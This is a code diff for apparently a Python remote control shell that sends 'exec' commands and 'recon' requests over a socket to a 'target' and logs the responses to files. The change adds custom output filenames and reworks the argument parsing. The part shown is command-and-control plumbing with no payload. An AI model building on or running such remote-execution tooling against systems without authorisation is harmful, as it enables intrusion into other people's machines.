@@ -53,18 +53,27 @@ def ctrl_shell_server(s, PORT):
             # exec
             elif inp.split()[0] == cmds[2]:
                 inp += ' '  # for regex
-                if re.search('^exec ((("[^"]+")|(-o))\ )+$', inp):
-                    # remove -o's, trailing space
-                    tmp = inp.replace('-o ', '')[:-1]
-                    ctrl_shell_generic(conn, tmp, '-o' in inp.split())
+                exec_regex = '^exec ((("[^"]+")|(-o( [\w.]+)?))\ )+$'
+                if re.search(exec_regex, inp) and '"' in inp:
+                    ctrl_shell_generic(conn, *ctrl_shell_exec_preproc(inp))
                 else:
                     print 'Execute commands on target.'
-                    print 'usage: exec "cmd1" ["cmd2" "cmd3" ...]'
-                    print '\nNote: If the command isn\'t found on target (via `which\'), it will be discarded to make less noise.'
+                    print 'usage: exec [-o [filename]] "cmd1" ["cmd2" "cmd3" ...]'
+                    print '\nExecute given commands and optionally log to file with optional filename.'
+                    print '\noptions:'
+                    print '-h\t\tshow help'
+                    print '-o filename\t\twrite results to file in {}/'.format(OUT)
             # recon
             elif inp.split()[0] == cmds[3]:
-                if re.search('^recon( -o)?$', inp):
-                    ctrl_shell_generic(conn, inp.split()[0], '-o' in inp.split())
+                if re.search('^recon( -o( [\w.]+)?)?$', inp):
+                    if '-o' in inp.split():
+                        if len(inp.split()) == 3:
+                            ctrl_shell_generic(conn, inp.split()[0], True,
+                                               inp.split()[2])
+                        else:
+                            ctrl_shell_generic(conn, inp.split()[0], True)
+                    else:
+                        ctrl_shell_generic(conn, inp.split()[0])
                 else:
                     print 'Basic reconaissance of target.'
                     print 'usage: recon [-h] [-o]'
@@ -93,17 +102,20 @@ def ctrl_shell_server(s, PORT):
     print '[+] ({}) Exiting control shell.'.format(datetime.now())
 
 
-def ctrl_shell_generic(s, msg, write_flag):
-    response = ctrl_shell_exchange(s, msg)
-    print response
+def ctrl_shell_generic(s, req, write_flag=False, write_file=None):
+    resp = ctrl_shell_exchange(s, req)
+    print resp
     if write_flag:
-        ctrl_shell_write(response, msg.split()[0], OUT)
+        ctrl_shell_write(resp, req.split()[0], OUT, write_file)
 
 
-def ctrl_shell_write(response, prefix, out_dir):
+def ctrl_shell_write(response, prefix, out_dir, write_file=None):
     ts = datetime.now().strftime('%Y%m%d%M%S')
     out_ts_dir = '{}/{}'.format(out_dir, ts[:len('20140101')])
-    outfile = '{}/{}-{}.txt'.format(out_ts_dir, prefix, ts)
+    if write_file:
+        outfile = '{}/{}'.format(out_ts_dir, write_file)
+    else:
+        outfile = '{}/{}-{}.txt'.format(out_ts_dir, prefix, ts)
     response = '{}\n\n{}'.format(datetime.now(), response)
     if not os.path.isdir(out_dir):
         os.mkdir(out_dir)
@@ -112,6 +124,21 @@ def ctrl_shell_write(response, prefix, out_dir):
     with open(outfile, 'w') as f:
         f.write(response)
         print 'psh : {} log written to {}'.format(prefix, outfile)
+
+
+def ctrl_shell_exec_preproc(inp):
+    # normalize
+    tmp = inp.replace('-o', '').replace('  ', ' ')
+    tmp = tmp.split()
+    # find potential custom filename
+    write_file = None
+    for i, each in enumerate(tmp):
+        if each != 'exec' and '"' not in each:
+            write_file = each
+            del tmp[i]
+    tmp = ' '.join(tmp)
+    write_flag = '-o' in inp.split()
+    return tmp, write_flag, write_file
 
 
 def ctrl_shell_shell(s, prompt):
@@ -133,8 +160,8 @@ def ctrl_shell_shell(s, prompt):
             break
 
 
-def ctrl_shell_exchange(conn, msg):
-    socksend(conn, msg)
+def ctrl_shell_exchange(conn, req):
+    socksend(conn, req)
     return sockrecv(conn)
 
 
